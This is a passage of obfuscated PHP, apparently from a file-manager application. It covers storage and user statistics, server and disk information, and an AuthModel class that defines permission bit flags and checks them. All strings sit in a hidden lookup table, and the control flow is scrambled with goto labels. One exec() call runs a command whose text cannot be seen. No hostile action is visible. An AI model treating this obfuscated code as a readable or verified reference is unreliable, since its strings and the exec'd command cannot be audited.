$Eô†õ‡ÇÚ²[$c„‰…ÜãÊí[401]] = 0; $C§ó›ğ´Ì = Model($c„‰…ÜãÊí[798])->where($Eô†õ‡ÇÚ²)->sum($c„‰…ÜãÊí[78]); goto fÓ½íÁØ™Û; fÓ½íÁØ™Û: $Eô†õ‡ÇÚ²[$c„‰…ÜãÊí[402]] = 1; $e³ïŠÂ‡È¢ = Model($c„‰…ÜãÊí[798])->where($Eô†õ‡ÇÚ²)->sum($c„‰…ÜãÊí[78]); $Eô†õ‡ÇÚ²[$c„‰…ÜãÊí[402]] = 2; goto cĞ“Œ–¼ø©; cĞ“Œ–¼ø©: $d¾õçÔ÷£ = Model($c„‰…ÜãÊí[798])->where($Eô†õ‡ÇÚ²)->sum($c„‰…ÜãÊí[78]); $F·Ö¤’ÏéÛ = array($c„‰…ÜãÊí[221] => $fÄÉÔ–Ëª›, $c„‰…ÜãÊí[724] => (int) $C§ó›ğ´Ì, $c„‰…ÜãÊí[1621] => (int) $aÆîœ«±ğ, $c„‰…ÜãÊí[1622] => (int) $e³ïŠÂ‡È¢, $c„‰…ÜãÊí[1623] => (int) $d¾õçÔ÷£); return $this->insert($F·Ö¤’ÏéÛ); goto BîŠ±â„òÉ; Aö†ÛîĞåï: $c„‰…ÜãÊí =& $_SERVER[¬ı§†‰ú˜¼]; $E‚ØîË–À = strtotime(date($c„‰…ÜãÊí[1629], strtotime($fÄÉÔ–Ëª›))); $Eô†õ‡ÇÚ² = array($c„‰…ÜãÊí[193] => array($c„‰…ÜãÊí[969], $E‚ØîË–À)); goto Aíè­‹×; BîŠ±â„òÉ: } public function trend($EæãÈ­Í¼, $Cñß„‡™ŸÍ) { goto BÏ™ù”Ëï³; dñÜ–Ñé¬—: if ($b­’ïÅßÏï && $Cñß„‡™ŸÍ != $a•–²”›’¸[1501]) { $a¢©Ò¿Ã¿Ñ = $b­’ïÅßÏï[0][$a•–²”›’¸[221]]; $f‹æ¡ÏœÀ = $this->validDate($Cñß„‡™ŸÍ, $a¢©Ò¿Ã¿Ñ); $d³”¤Ç‚”É = array(); $E•¸¾±î· = array_to_keyvalue($b­’ïÅßÏï, $a•–²”›’¸[221]); foreach ($f‹æ¡ÏœÀ as $eâ×´°ğ”) { if (isset($E•¸¾±î·[$eâ×´°ğ”])) { $bÂŠëÎÖ«Ù = $E•¸¾±î·[$eâ×´°ğ”]; } else { $bÂŠëÎÖ«Ù = end($b­’ïÅßÏï); $bÂŠëÎÖ«Ù[$a•–²”›’¸[221]] = $eâ×´°ğ”; if ($EæãÈ­Í¼ == $a•–²”›’¸[561]) { $bÂŠëÎÖ«Ù[$a•–²”›’¸[1617]] = $bÂŠëÎÖ«Ù[$a•–²”›’¸[1618]] = 0; } } $d³”¤Ç‚”É[] = $bÂŠëÎÖ«Ù; } $b­’ïÅßÏï = $d³”¤Ç‚”É; } $AÏÈÌ¸¥Â‡ = array($a•–²”›’¸[561] => array($a•–²”›’¸[726] => LNG($a•–²”›’¸[1633]), $a•–²”›’¸[1617] => LNG($a•–²”›’¸[1634]), $a•–²”›’¸[1618] => LNG($a•–²”›’¸[1635])), $a•–²”›’¸[1619] => array($a•–²”›’¸[724] => LNG($a•–²”›’¸[1636]), $a•–²”›’¸[1621] => LNG($a•–²”›’¸[1637]), $a•–²”›’¸[1622] => LNG($a•–²”›’¸[1638]), $a•–²”›’¸[1623] => LNG($a•–²”›’¸[1639]))); $E±Š§´êŠÍ = array($a•–²”›’¸[561] => $a•–²”›’¸[1640], $a•–²”›’¸[1619] => $a•–²”›’¸[78]); goto Dá¬¬­¿ª; fÚŒ°‘ˆ–¬: return $fïÂØ½Ú‹Î; goto Aêµé‘ç·×; Dá¬¬­¿ª: if (empty($b­’ïÅßÏï)) { $eâ×´°ğ” = date($a•–²”›’¸[1624], strtotime($a•–²”›’¸[1625])); $D¹óÂ¨ğªß = array($a•–²”›’¸[221] => $eâ×´°ğ”); foreach ($AÏÈÌ¸¥Â‡[$EæãÈ­Í¼] as $eîÏ©“¯œ® => $b¸¶é¬Îä) { $D¹óÂ¨ğªß[$eîÏ©“¯œ®] = 0; } $b­’ïÅßÏï[] = $D¹óÂ¨ğªß; } $fïÂØ½Ú‹Î = array(); foreach ($b­’ïÅßÏï as $b¸¶é¬Îä) { if ($EæãÈ­Í¼ == $a•–²”›’¸[1619] && $b¸¶é¬Îä[$a•–²”›’¸[1621]] > $b¸¶é¬Îä[$a•–²”›’¸[724]]) { $b¸¶é¬Îä[$a•–²”›’¸[1621]] = $b¸¶é¬Îä[$a•–²”›’¸[724]]; } foreach ($AÏÈÌ¸¥Â‡[$EæãÈ­Í¼] as $eîÏ©“¯œ® => $d„ÉÙ¯ƒÜˆ) { $bÂŠëÎÖ«Ù = array($a•–²”›’¸[221] => $b¸¶é¬Îä[$a•–²”›’¸[221]], $a•–²”›’¸[1431] => $d„ÉÙ¯ƒÜˆ); $bÂŠëÎÖ«Ù[$E±Š§´êŠÍ[$EæãÈ­Í¼]] = isset($b¸¶é¬Îä[$eîÏ©“¯œ®]) ? $b¸¶é¬Îä[$eîÏ©“¯œ®] : 0; $fïÂØ½Ú‹Î[] = $bÂŠëÎÖ«Ù; } } goto fÚŒ°‘ˆ–¬; BÏ™ù”Ëï³: $a•–²”›’¸ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->init($EæãÈ­Í¼)) { return !1; } $b­’ïÅßÏï = $this->trendList($EæãÈ­Í¼); goto dñÜ–Ñé¬—; Aêµé‘ç·×: } public function validDate($CÌÅ·„Œ”«, $Aç¤¸¨¥ù‰) { goto fèíÛÃ±Ë¡; FÁÍùˆ™ù§: switch ($CÌÅ·„Œ”«) { case $AÀ×‡“Şô¬[1508]: $f£”ù…æ˜ = mktime(0, 0, 0, date($AÀ×‡“Şô¬[1641]), date($AÀ×‡“Şô¬[1251]) - date($AÀ×‡“Şô¬[1313]) + 7 - 7, date($AÀ×‡“Şô¬[1642])); $E—­¿•ñòç = 0; do { $DÚ¹÷­áÍ = date($AÀ×‡“Şô¬[1624], $f£”ù…æ˜ - 3600 * 24 * 7 * $E—­¿•ñòç); $CÙÛ‹ÒëÀò[] = $DÚ¹÷­áÍ; $E—­¿•ñòç++; } while ($Aç¤¸¨¥ù‰ < $DÚ¹÷­áÍ); break; case $AÀ×‡“Şô¬[1506]: $E—­¿•ñòç = 1; do { $B¯²©§øæ• = date($AÀ×‡“Şô¬[1643], strtotime("\55\40{$E—­¿•ñòç}\x20\x6d\x6f\156\x74\x68\x73")); $CÙÛ‹ÒëÀò[] = $B¯²©§øæ•; $E—­¿•ñòç++; } while ($Aç¤¸¨¥ù‰ < $B¯²©§øæ•); break; case $AÀ×‡“Şô¬[1644]: $eÛÏÃ‹»¢Ñ = (int) date($AÀ×‡“Şô¬[1642], strtotime($Aç¤¸¨¥ù‰)); $fÕ¤ùÙ½”‘ = (int) date($AÀ×‡“Şô¬[1642]); if ($eÛÏÃ‹»¢Ñ >= $fÕ¤ùÙ½”‘) { break; } for ($eÛÏÃ‹»¢Ñ; $eÛÏÃ‹»¢Ñ < $fÕ¤ùÙ½”‘; $eÛÏÃ‹»¢Ñ++) { $CÙÛ‹ÒëÀò[] = $eÛÏÃ‹»¢Ñ . $AÀ×‡“Şô¬[1645]; } break; default: break; } if ($Aç¤¸¨¥ù‰ > end($CÙÛ‹ÒëÀò)) { array_pop($CÙÛ‹ÒëÀò); } sort($CÙÛ‹ÒëÀò); goto EÏïËîğ´†; fèíÛÃ±Ë¡: $AÀ×‡“Şô¬ =& $_SERVER[¬ı§†‰ú˜¼]; $e©®Õ®Êè = date($AÀ×‡“Şô¬[1624], strtotime($AÀ×‡“Şô¬[1625])); $CÙÛ‹ÒëÀò = array($e©®Õ®Êè); goto FÁÍùˆ™ù§; EÏïËîğ´†: return $CÙÛ‹ÒëÀò; goto C—ã—‹Š¶Ê; C—ã—‹Š¶Ê: } public function listTable($C£ÂŸ¶Œ²ˆ) { $fĞ«øˆæÚÉ = ucfirst($C£ÂŸ¶Œ²ˆ); return Model($fĞ«øˆæÚÉ)->listData(); } public function option($C©ºÏ–ä¢) { $dÓË¥Ğ  = $_SERVER[¬ı§†‰ú˜¼][1646] . ucfirst($C©ºÏ–ä¢); return $this->{$dÓË¥Ğ }(); } private function optionUser() { goto a„®½‘´Ã„; a„®½‘´Ã„: $cğÅÓ±¢± =& $_SERVER[¬ı§†‰ú˜¼]; $bÀ¦§»ÛŒÉ = Model($cğÅÓ±¢±[505])->count($cğÅÓ±¢±[1527]); $bˆ¥Á¼á = Model($cğÅÓ±¢±[505])->where($cğÅÓ±¢±[1647])->count($cğÅÓ±¢±[1527]); goto a™‡™¹œØæ; d†Ü”Ò±ŒÈ: return array($cğÅÓ±¢±[720] => (int) $bÀ¦§»ÛŒÉ, $cğÅÓ±¢±[1649] => (int) ($bÀ¦§»ÛŒÉ - $bˆ¥Á¼á), $cğÅÓ±¢±[1650] => (int) $bˆ¥Á¼á, $cğÅÓ±¢±[1651] => (int) $a¬ºƒ‡ô—Ù, $cğÅÓ±¢±[1652] => $E·Ë°º›¼Û); goto FÀï™„•Ÿ; a¿¼Äæ–…: if ($A÷¹¢ùä¶ < $F†¥ğ™‹ÜÉ) { $A÷¹¢ùä¶ = $F†¥ğ™‹ÜÉ; } $bãÈ—äìŸ = array($cğÅÓ±¢±[1648] => array($cğÅÓ±¢±[970], $A÷¹¢ùä¶)); $E·Ë°º›¼Û = (int) Model($cğÅÓ±¢±[505])->where($bãÈ—äìŸ)->count($cğÅÓ±¢±[1527]); goto a“§Ï’å«’; a“§Ï’å«’: if (!$E·Ë°º›¼Û) { $E·Ë°º›¼Û = 1; } $bãÈ—äìŸ = array($cğÅÓ±¢±[1648] => array($cğÅÓ±¢±[970], $F†¥ğ™‹ÜÉ)); $a¬ºƒ‡ô—Ù = Model($cğÅÓ±¢±[505])->where($bãÈ—äìŸ)->count($cğÅÓ±¢±[1527]); goto d†Ü”Ò±ŒÈ; a™‡™¹œØæ: $bÌ¤ê¶Ò¯ğ = intval($GLOBALS[$cğÅÓ±¢±[6]][$cğÅÓ±¢±[346]][$cğÅÓ±¢±[1487]]) / 3600; $A÷¹¢ùä¶ = strtotime("\55{$bÌ¤ê¶Ò¯ğ}\x20\x68\x6f\165\162\163"); $F†¥ğ™‹ÜÉ = strtotime(date($cğÅÓ±¢±[1628])); goto a¿¼Äæ–…; FÀï™„•Ÿ: } private function optionFile() { goto bŠ±¨µŒ„; EŸè‘ «°•: $Bäß ËŒ‹ = $Cô•’Â‹º½[$Fš¦Ğ±‹èƒ[1621]]; $DÇ ÓÓéç§ = Model($Fš¦Ğ±‹èƒ[798])->where(array($Fš¦Ğ±‹èƒ[401] => 0))->count($Fš¦Ğ±‹èƒ[394]); $bŸçé¿Ú· = array($Fš¦Ğ±‹èƒ[401] => 0, $Fš¦Ğ±‹èƒ[193] => array($Fš¦Ğ±‹èƒ[970], strtotime(date($Fš¦Ğ±‹èƒ[1628])))); goto fª„Ø‚›ß¾; fª„Ø‚›ß¾: $B³Ë“¨Í© = Model($Fš¦Ğ±‹èƒ[798])->where($bŸçé¿Ú·)->sum($Fš¦Ğ±‹èƒ[78]); $eòà ÷¿°÷ = Model($Fš¦Ğ±‹èƒ[798])->where($bŸçé¿Ú·)->count($Fš¦Ğ±‹èƒ[394]); return array($Fš¦Ğ±‹èƒ[724] => $CŠ ëÉ‹ƒ˜, $Fš¦Ğ±‹èƒ[1621] => $Bäß ËŒ‹, $Fš¦Ğ±‹èƒ[1653] => $CŠ ëÉ‹ƒ˜ - $Bäß ËŒ‹, $Fš¦Ğ±‹èƒ[1654] => (int) $B³Ë“¨Í©, $Fš¦Ğ±‹èƒ[726] => (int) $DÇ ÓÓéç§, $Fš¦Ğ±‹èƒ[1655] => (int) $eòà ÷¿°÷); goto E¸Äó˜ŒŠ; bŠ±¨µŒ„: $Fš¦Ğ±‹èƒ =& $_SERVER[¬ı§†‰ú˜¼]; $Cô•’Â‹º½ = $this->sourceSize(); $CŠ ëÉ‹ƒ˜ = $Cô•’Â‹º½[$Fš¦Ğ±‹èƒ[78]]; goto EŸè‘ «°•; E¸Äó˜ŒŠ: } private function optionAccess() { $a–èÅ¥‘İÒ =& $_SERVER[¬ı§†‰ú˜¼]; return array($a–èÅ¥‘İÒ[720] => $this->typeLogCnt(), $a–èÅ¥‘İÒ[107] => $this->typeLogCnt($a–èÅ¥‘İÒ[107]), $a–èÅ¥‘İÒ[428] => $this->typeLogCnt($a–èÅ¥‘İÒ[428]), $a–èÅ¥‘İÒ[1656] => $this->typeLogCnt($a–èÅ¥‘İÒ[1656]), $a–èÅ¥‘İÒ[1657] => $this->typeLogCnt($a–èÅ¥‘İÒ[1657]), $a–èÅ¥‘İÒ[561] => $this->typeLogCnt($a–èÅ¥‘İÒ[33], $a–èÅ¥‘İÒ[1632])); } private function typeLogCnt($Eê«ÆÀ»ƒç = '', $fŸáºŠ¬Å¦ = "\151\144") { goto Fê†Ìï«ƒ; EôÓ‹†÷Ù: $e—Ÿó›æ»– = array($e•÷Ü¨Ê¯¸[193] => array($e•÷Ü¨Ê¯¸[970], $Bá«©áø¹ˆ)); if ($Eê«ÆÀ»ƒç) { $e—Ÿó›æ»–[$e•÷Ü¨Ê¯¸[29]] = array($e•÷Ü¨Ê¯¸[7], $bğ› óÌŠª[$Eê«ÆÀ»ƒç]); } $a÷—öˆùÚè = Model($e•÷Ü¨Ê¯¸[1631])->where($e—Ÿó›æ»–)->count($fŸáºŠ¬Å¦); goto B·ï’ˆğš±; Fê†Ìï«ƒ: $e•÷Ü¨Ê¯¸ =& $_SERVER[¬ı§†‰ú˜¼]; $bğ› óÌŠª = array($e•÷Ü¨Ê¯¸[107] => array($e•÷Ü¨Ê¯¸[1658], $e•÷Ü¨Ê¯¸[1659]), $e•÷Ü¨Ê¯¸[428] => array($e•÷Ü¨Ê¯¸[1660], $e•÷Ü¨Ê¯¸[1661]), $e•÷Ü¨Ê¯¸[1656] => array($e•÷Ü¨Ê¯¸[1662], $e•÷Ü¨Ê¯¸[1663], $e•÷Ü¨Ê¯¸[1664]), $e•÷Ü¨Ê¯¸[1657] => array($e•÷Ü¨Ê¯¸[1665], $e•÷Ü¨Ê¯¸[1666]), $e•÷Ü¨Ê¯¸[1667] => array($e•÷Ü¨Ê¯¸[1668], $e•÷Ü¨Ê¯¸[1669], $e•÷Ü¨Ê¯¸[1670])); $Bá«©áø¹ˆ = strtotime(date($e•÷Ü¨Ê¯¸[1628])); goto EôÓ‹†÷Ù; B·ï’ˆğš±: return (int) $a÷—öˆùÚè; goto cŠÌ¾êä‘; cŠÌ¾êä‘: } private function optionServer() { goto DÜº™§; e‡óÁÊ‚Ï: return array($c„³ª¬»²[1673] => $FãéğõëÕ ? $FãéğõëÕ[$c„³ª¬»²[1674]] : 0, $c„³ª¬»²[1675] => $FãéğõëÕ ? $FãéğõëÕ[$c„³ª¬»²[1676]] : 0, $c„³ª¬»²[1677] => (int) $c×Ú£ŠøÁ’[$c„³ª¬»²[1674]] * 1024 * 1024 * 1024, $c„³ª¬»²[1678] => (int) $dÙñƒ¹œèø, $c„³ª¬»²[1679] => ucfirst($Bù¼¡’ÇÎ–), $c„³ª¬»²[1680] => $c„³ª¬»²[1681] . PHP_VERSION, $c„³ª¬»²[1682] => phpBuild64() ? 64 : 32, $c„³ª¬»²[719] => str_replace($c„³ª¬»²[1683], $c„³ª¬»²[947], $DãÅÄµŠŸ), $c„³ª¬»²[346] => ucfirst($aæóØÀˆÓ), $c„³ª¬»²[28] => $_SERVER[$c„³ª¬»²[1684]]); goto b÷ê¡„ßÈÍ; d¦¡®øßÒ¸: if ($DãÅÄµŠŸ == $c„³ª¬»²[756]) { $DÂ›ª”ÇïŞ = explode($c„³ª¬»²[1165], $e ¢Ÿ×áïÏ[$c„³ª¬»²[930]]); $DãÅÄµŠŸ = $DÂ›ª”ÇïŞ[0]; } if ($DãÅÄµŠŸ == $c„³ª¬»²[759] || $DãÅÄµŠŸ == $c„³ª¬»²[760]) { $C‹ç‚ëâ¹Æ = Model()->db()->query($c„³ª¬»²[1671]); $CÏŒ¡«–Î = $C‹ç‚ëâ¹Æ[0] && isset($C‹ç‚ëâ¹Æ[0][$c„³ª¬»²[1430]]) ? $C‹ç‚ëâ¹Æ[0][$c„³ª¬»²[1430]] : 0; $DãÅÄµŠŸ = $c„³ª¬»²[1672] . ($CÏŒ¡«–Î ? $c„³ª¬»²[8] . $CÏŒ¡«–Î : $c„³ª¬»²[33]); } $aæóØÀˆÓ = $GLOBALS[$c„³ª¬»²[6]][$c„³ª¬»²[346]][$c„³ª¬»²[800]]; goto e‡óÁÊ‚Ï; DÜº™§: $c„³ª¬»² =& $_SERVER[¬ı§†‰ú˜¼]; $FãéğõëÕ = $this->diskDriver(); $c×Ú£ŠøÁ’ = KodIO::defaultDriver(); goto e¶Ãˆùï; E­’†Ù¤­—: $Bù¼¡’ÇÎ– = $D†Ã¾¾Ó¨Ñ[0]; $e ¢Ÿ×áïÏ = $GLOBALS[$c„³ª¬»²[6]][$c„³ª¬»²[17]]; $DãÅÄµŠŸ = $e ¢Ÿ×áïÏ[$c„³ª¬»²[931]]; goto d¦¡®øßÒ¸; e¶Ãˆùï: $eï¹„ôÁâØ = array($c„³ª¬»²[790] => $c×Ú£ŠøÁ’[$c„³ª¬»²[392]]); $dÙñƒ¹œèø = Model($c„³ª¬»²[448])->where($eï¹„ôÁâØ)->sum($c„³ª¬»²[78]); $D†Ã¾¾Ó¨Ñ = explode($c„³ª¬»²[50], $_SERVER[$c„³ª¬»²[142]]); goto E­’†Ù¤­—; b÷ê¡„ßÈÍ: } private function diskDriver() { goto eÒ©è£Ä£ò; eÒ©è£Ä£ò: $AšŠÄÎª‰í =& $_SERVER[¬ı§†‰ú˜¼]; $CÉ£Ï‘È = $AšŠÄÎª‰í[8]; $BÊ…—ˆ×Ì = $GLOBALS[$AšŠÄÎª‰í[6]][$AšŠÄÎª‰í[1685]] == $AšŠÄÎª‰í[1686]; goto eõÄˆ¯††ø; eõÄˆ¯††ø: if ($BÊ…—ˆ×Ì) { $CÉ£Ï‘È = $AšŠÄÎª‰í[1687]; if (function_exists($AšŠÄÎª‰í[1688])) { exec($AšŠÄÎª‰í[1689], $a¡Èö¡â¬²); $CÉ£Ï‘È = $a¡Èö¡â¬²[1] . $AšŠÄÎª‰í[8]; } } if (!file_exists($CÉ£Ï‘È)) { return; } $C‘¾ÌÂ—‰ = @disk_total_space($CÉ£Ï‘È); goto B¡àßŠº»—; B¡àßŠº»—: $Då§­³½ª = $C‘¾ÌÂ—‰ - @disk_free_space($CÉ£Ï‘È); return array($AšŠÄÎª‰í[1674] => $C‘¾ÌÂ—‰, $AšŠÄÎª‰í[1676] => $Då§­³½ª); goto dé„Öª²ç; dé„Öª²ç: } public function fileChart($C°œù†°Ó) { goto C££À„Ãâï; Cö½éÆ½ïì: $C·Ğ÷èÆîÃ[$a¡¿ó²‹İ[402]] = 2; $aœõÁèÅÜÄ = Model($a¡¿ó²‹İ[798])->where($C·Ğ÷èÆîÃ)->sum($a¡¿ó²‹İ[78]); return array($a¡¿ó²‹İ[724] => $b™Ø§ÈÅ›ß[$a¡¿ó²‹İ[78]], $a¡¿ó²‹İ[1621] => $b™Ø§ÈÅ›ß[$a¡¿ó²‹İ[1621]], $a¡¿ó²‹İ[1622] => (int) $CÉ§‘å·¶, $a¡¿ó²‹İ[1623] => (int) $aœõÁèÅÜÄ); goto BŒŠŒæŒåø; C££À„Ãâï: $a¡¿ó²‹İ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($C°œù†°Ó[$a¡¿ó²‹İ[1527]])) { return Model($a¡¿ó²‹İ[798])->userFileTypeProfile($C°œù†°Ó[$a¡¿ó²‹İ[1527]]); } if (isset($C°œù†°Ó[$a¡¿ó²‹İ[1690]])) { return Model($a¡¿ó²‹İ[798])->groupFileTypeProfile($C°œù†°Ó[$a¡¿ó²‹İ[1690]]); } goto e´ÏŞø÷Éô; e´ÏŞø÷Éô: $b™Ø§ÈÅ›ß = $this->sourceSize(); $C·Ğ÷èÆîÃ = array($a¡¿ó²‹İ[476] => 0, $a¡¿ó²‹İ[402] => 1); $CÉ§‘å·¶ = Model($a¡¿ó²‹İ[798])->where($C·Ğ÷èÆîÃ)->sum($a¡¿ó²‹İ[78]); goto Cö½éÆ½ïì; BŒŠŒæŒåø: } private function sourceSize() { $EÊÂª‚šİ =& $_SERVER[¬ı§†‰ú˜¼]; $B«î¬ŒïÎ = Model($EÊÂª‚šİ[798])->where(array($EÊÂª‚šİ[401] => 0))->sum($EÊÂª‚šİ[78]); $AÔÃÓ…›Â” = Model($EÊÂª‚šİ[448])->sum($EÊÂª‚šİ[78]); if ($AÔÃÓ…›Â” > $B«î¬ŒïÎ) { $AÔÃÓ…›Â” = $B«î¬ŒïÎ; } return array($EÊÂª‚šİ[78] => (int) $B«î¬ŒïÎ, $EÊÂª‚šİ[1621] => (int) $AÔÃÓ…›Â”); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $dîÂï‹˜‚ =& $_SERVER[¬ı§†‰ú˜¼]; $eŒ•óœ§¼Î = array(array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1691]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1693], $dîÂï‹˜‚[1694] => 1, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1697]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1698], $dîÂï‹˜‚[1694] => 2, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1699]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1700], $dîÂï‹˜‚[1694] => 3, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1701]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1702], $dîÂï‹˜‚[1694] => 4, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_VIEW), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1703]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1704], $dîÂï‹˜‚[1694] => 5, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1705]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1706], $dîÂï‹˜‚[1694] => 6, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($dîÂï‹˜‚[411] => LNG($dîÂï‹˜‚[1707]), $dîÂï‹˜‚[1692] => $dîÂï‹˜‚[1708], $dîÂï‹˜‚[1694] => 7, $dîÂï‹˜‚[1695] => 1, $dîÂï‹˜‚[1696] => 0)); return $eŒ•óœ§¼Î; } public static function authCheck($EŠ›Èì‘“™, $dÅÍ×ÔšÆ¨) { $EŠ›Èì‘“™ = intval($EŠ›Èì‘“™); if ($GLOBALS[$_SERVER[¬ı§†‰ú˜¼][483]]) { return !0; } if ($EŠ›Èì‘“™ <= 0) { return !1; } if (($EŠ›Èì‘“™ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($EŠ›Èì‘“™ & $dÅÍ×ÔšÆ¨); } public static function authCheckShow($EÕó£Î·³Ü) { return self::authCheck($EÕó£Î·³Ü, self::AUTH_SHOW); } public static function authCheckView($e‰äòéò†) { return self::authCheck($e‰äòéò†, self::AUTH_VIEW); } public static function authCheckDownload($aµŒ»ÓÉƒ¥) { return self::authCheck($aµŒ»ÓÉƒ¥, self::AUTH_DOWNLOAD); } public static function authCheckUpload($CçÃÃêÂÃ) { return self::authCheck($CçÃÃêÂÃ, self::AUTH_UPLOAD); } public static function authCheckEdit($c±â§Ø†) { return self::authCheck($c±â§Ø†, self::AUTH_EDIT); } public static function authCheckRemove($C¦ÛèÌ¤Ï) { return self::authCheck($C¦ÛèÌ¤Ï, self::AUTH_REMOVE); } public static function authCheckShare($D§Ë·¤áãï) { return self::authCheck($D§Ë·¤áãï, self::AUTH_SHARE); } public static function authCheckComment($b¥ºÎÀ‘‚í) { return self::authCheck($b¥ºÎÀ‘‚í, self::AUTH_COMMENT); } public static function authCheckEvent($B—Œİ¹øïó) { return self::authCheck($B—Œİ¹øïó, self::AUTH_EVENT); } public static function authCheckRoot($AÑ“â¤ËÛƒ) { return self::authCheck($AÑ“â¤ËÛƒ, self::AUTH_ROOT); } public static function authCheckAction($cìß¤©ìà, $d²àÅ„ÀÉ) { goto bÃÊ¯èÎäĞ; AëÓîÄ¡«: $Dõ˜ó‰†ò½ = $EÉºœ®¡Õ…[$d²àÅ„ÀÉ]; $cìß¤©ìà = intval($cìß¤©ìà); if ($cìß¤©ìà <= 0) { return !1; } goto eƒŠéö¯¥“; eƒŠéö¯¥“: if (($cìß¤©ìà & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cìß¤©ìà & $Dõ˜ó‰†ò½); goto a¦Š‹ÊÏŒ; bÃÊ¯èÎäĞ: $d«ù‡œƒ‚ =& $_SERVER[¬ı§†‰ú˜¼]; $EÉºœ®¡Õ… = array($d«ù‡œƒ‚[1709] => self::AUTH_VIEW, $d«ù‡œƒ‚[1093] => self::AUTH_DOWNLOAD, $d«ù‡œƒ‚[107] => self::AUTH_UPLOAD, $d«ù‡œƒ‚[1657] => self::AUTH_EDIT, $d«ù‡œƒ‚[1656] => self::AUTH_REMOVE, $d«ù‡œƒ‚[1667] => self::AUTH_SHARE, $d«ù‡œƒ‚[351] => self::AUTH_COMMENT, $d«ù‡œƒ‚[1516] => self::AUTH_EVENT, $d«ù‡œƒ‚[1710] => self::AUTH_ROOT); if (!isset($EÉºœ®¡Õ…[$d²àÅ„ÀÉ])) { return; } goto AëÓîÄ¡«; a¦Š‹ÊÏŒ: } public static function authDisable($c¿Â°Ã¸®ï, $DØÊª ’Á´) { if (intval($c¿Â°Ã¸®ï) <= 0) { return 0; } return intval($c¿Â°Ã¸®ï) & ~$DØÊª ’Á´; } public $optionType = "\x53\171\x73\164\145\x6d\x2e\163\x6f\x75\162\143\145\x41\x75\x74\x68\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\x75\x74\150", "\154\x61\x62\145\154", "\x64\151\x73\x70\154\141\x79", "\x73\x79\x73\x74\x65\155", "\163\x6f\162\164"); public function initData() { $E¥öÜ…ùß = $this->authDefault(); foreach ($E¥öÜ…ùß as $C–ŒµÑ¶ß˜) { $this->add($C–ŒµÑ¶ß˜); } } public function listData($Eâ¨¦™°áç = false, $a«³é¶°¼á = "\163\x6f\x72\x74", $fÛ‘ˆˆ•…¥ = false) { return parent::listData($Eâ¨¦™°áç, $a«³é¶°¼á, $fÛ‘ˆˆ•…¥); } public function update($a„ˆ½ŒµÈµ, $Bë¾Òô¾íø) { $Eá™õ¶×‘ò =& $_SERVER[¬ı§†‰ú˜¼]; $bîÁĞ®ğù· = parent::listData($a„ˆ½ŒµÈµ); $A’ Ú¢Û‘· = $this->findByName($Bë¾Òô¾íø[$Eá™õ¶×‘ò[28]]); if (!$bîÁĞ®ğù· || $A’ Ú¢Û‘· && $A’ Ú¢Û‘·[$Eá™õ¶×‘ò[392]] != $bîÁĞ®ğù·[$Eá™õ¶×‘ò[392]]) { return !1; } $this->filterAuth($Bë¾Òô¾íø[$Eá™õ¶×‘ò[404]]); return parent::update($a„ˆ½ŒµÈµ, $Bë¾Òô¾íø); } public function remove($AØ¯êâÑ˜Ÿ) { $bµÌŠÇÙªŞ = parent::listData($AØ¯êâÑ˜Ÿ); if (!$bµÌŠÇÙªŞ || $bµÌŠÇÙªŞ[$_SERVER[¬ı§†‰ú˜¼][1169]]) { return !1; } return parent::remove($AØ¯êâÑ˜Ÿ); } public function add($c¤£—ëã = array()) { goto E¯äš±ÂÏŸ; E¯äš±ÂÏŸ: $dŠÒ¼„î¶² =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->findByName($c¤£—ëã[$dŠÒ¼„î¶²[28]])) { return !1; } $B†ïóøôêÏ = array($dŠÒ¼„î¶²[28] => 